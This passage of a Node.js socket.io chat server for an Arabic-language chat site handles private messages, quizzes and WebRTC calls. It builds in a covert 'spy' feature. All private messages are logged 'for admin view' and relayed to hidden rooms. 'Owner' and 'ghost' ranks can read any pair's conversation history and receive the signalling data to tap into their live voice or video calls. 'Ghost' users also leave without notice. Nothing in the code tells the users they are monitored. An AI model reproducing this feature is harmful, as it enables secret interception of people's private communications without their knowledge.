    if (data.targetSid) io.to(data.targetSid).emit('user-from-spy-offer', { offer: data.offer, spyId: socket.id });
  });
  // User sends answer back to spy
  socket.on('user-to-spy-answer', (data) => {
    // data: { spyId, answer }
    if (data.spyId) io.to(data.spyId).emit('spy-from-user-answer', { answer: data.answer, userSid: socket.id });
  });
  // ICE relay between spy and user
  socket.on('spy-to-user-ice', (data) => {
    if (data.targetSid) io.to(data.targetSid).emit('user-from-spy-ice', { candidate: data.candidate, spyId: socket.id });
  });
  socket.on('user-to-spy-ice', (data) => {
    if (data.spyId) io.to(data.spyId).emit('spy-from-user-ice', { candidate: data.candidate });
  });

  socket.on('admin-add-quiz-q', (data) => {
    const user = chatUsers[socket.id];
    if (!user || !['owner','owner_admin','super_admin','admin'].includes(user.rank)) return;
    if (!data.q || !data.a) return;
    const newQ = { q: data.q.trim(), a: data.a.trim(), hint: data.hint||'', points: parseInt(data.points)||50 };
    adminQuizQuestions.push(newQ);
    Object.keys(quizState).forEach(roomId => {
      if (quizState[roomId]) quizState[roomId].pool.push({...newQ});
    });
    socket.emit('quiz-q-added', { ok:true, count: adminQuizQuestions.length });
  });

  socket.on('private-message',(data)=>{
    const sender=chatUsers[socket.id]; if (!sender) return;
    const sid=Object.keys(chatUsers).find(id=>chatUsers[id].name===data.to); if (!sid) return;
    const pm={type:'private',from:sender.name,to:data.to,text:data.text,time:getTime(),fromRank:sender.rank,fromRankInfo:RANKS[sender.rank]};
    socket.emit('private-message',pm); io.to(sid).emit('private-message',pm);
    // Store PM in memory for admin view
    const convKey = [sender.name, data.to].sort().join('||');
    if (!memPMs[convKey]) memPMs[convKey] = [];
    memPMs[convKey].push({...pm, ts: Date.now()});
    if (memPMs[convKey].length > 200) memPMs[convKey].shift();
    // Save to DB if available
    if (useDB) {
      db.query(
        `INSERT INTO private_messages (conv_key,from_user,to_user,text,time) VALUES ($1,$2,$3,$4,$5)`,
        [convKey, sender.name, data.to, data.text, getTime()]
      ).catch(()=>{});
    }
    // Broadcast to any active spies on this conversation
    const spyRoom = 'spy||' + convKey;
    io.to(spyRoom).emit('spy-pm', pm);
  });

  // ===== SPY: JOIN/LEAVE PM CONVERSATION =====
  socket.on('spy-join', (data) => {
    const admin = chatUsers[socket.id];
    if (!admin) return;
    if (admin.rank !== 'owner' && admin.rank !== 'ghost') return;
    const key = [data.user1, data.user2].sort().join('||');
    const spyRoom = 'spy||' + key;
    socket.join(spyRoom);
    const history = memPMs[key] || [];
    socket.emit('spy-history', { key, user1: data.user1, user2: data.user2, messages: history });
    // If active call → send offer with callerSid so spy can connect to both parties
    if (activeCalls[key]) {
      const call = activeCalls[key];
      // Find callerSid and receiverSid from chatUsers
      const callerSid = Object.keys(chatUsers).find(id => chatUsers[id].name === call.user1);
      const receiverSid = Object.keys(chatUsers).find(id => chatUsers[id].name === call.user2);
      socket.emit('spy-call-offer', {
        offer: call.offer || null,
        type: call.type,
        from: call.user1,
        convKey: key,
        callerSid: callerSid || null,
        receiverSid: receiverSid || null
      });
      // Also send receiver-ready so spy connects to receiver side too
      if (receiverSid) {
        socket.emit('spy-receiver-ready', {
          receiverName: call.user2, receiverSid, convKey: key
        });
      }
    }
  });
  socket.on('spy-leave', (data) => {
    const key = [data.user1, data.user2].sort().join('||');
    socket.leave('spy||' + key);
  });
  // ===== END SPY =====

  // WEBRTC VOICE/VIDEO SIGNALING
  socket.on('voice-join',(roomId)=>{
    const user=chatUsers[socket.id]; if (!user) return;
    if (!voiceRooms[roomId]) voiceRooms[roomId]=[];
    voiceRooms[roomId].forEach(pid=>{
      io.to(pid).emit('voice-user-joined',{peerId:socket.id,username:user.name});
      socket.emit('voice-user-joined',{peerId:pid,username:chatUsers[pid]?.name});
    });
    voiceRooms[roomId].push(socket.id);
    io.to(roomId).emit('voice-room-update',{roomId,users:voiceRooms[roomId].map(id=>chatUsers[id]?.name).filter(Boolean)});
  });
  socket.on('voice-leave',(roomId)=>{
    if (voiceRooms[roomId]){
      voiceRooms[roomId]=voiceRooms[roomId].filter(id=>id!==socket.id);
      io.to(roomId).emit('voice-user-left',{peerId:socket.id});
      io.to(roomId).emit('voice-room-update',{roomId,users:voiceRooms[roomId].map(id=>chatUsers[id]?.name).filter(Boolean)});
    }
  });
  socket.on('rtc-offer',(data)=>io.to(data.to).emit('rtc-offer',{from:socket.id,offer:data.offer}));
  socket.on('rtc-answer',(data)=>io.to(data.to).emit('rtc-answer',{from:socket.id,answer:data.answer}));
  socket.on('rtc-ice',(data)=>io.to(data.to).emit('rtc-ice',{from:socket.id,candidate:data.candidate}));

  socket.on('disconnect', async () => {
    const user=chatUsers[socket.id]; if (!user) return;
    const room=user.room;
    Object.keys(voiceRooms).forEach(vr=>{
      if (voiceRooms[vr].includes(socket.id)){
        voiceRooms[vr]=voiceRooms[vr].filter(id=>id!==socket.id);
        io.to(vr).emit('voice-user-left',{peerId:socket.id});
      }
    });
    delete chatUsers[socket.id];
    // Ghost disconnects silently
    if (user.rank !== 'ghost') {
      const msg=await saveMessage(room,null,`👋 ${user.name} غادر الموقع`,'system');
      io.to(room).emit('message',msg);
    }
    io.to(room).emit('room-users',getRoomUsers(room));
    io.emit('online-count', getOnlineCount());
    broadcastRoomCounts();
  });
});

const PORT = process.env.PORT || 3000;
// last-updated: 1773171725
initDB().then(() => server.listen(PORT, () => console.log(`غزل عراقي يعمل على المنفذ ${PORT}`)));
